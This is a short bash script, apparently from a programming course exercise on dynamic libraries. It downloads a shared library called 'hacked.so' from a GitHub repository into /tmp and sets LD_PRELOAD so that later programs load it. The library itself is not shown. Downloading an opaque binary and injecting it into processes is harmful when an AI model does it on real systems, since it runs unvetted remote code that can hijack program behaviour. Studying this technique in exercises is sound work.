#!/bin/bash
wget -P /tmp https://github.com/Pslansana/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hacked.so
export LD_PRELOAD=/tmp/hacked.so
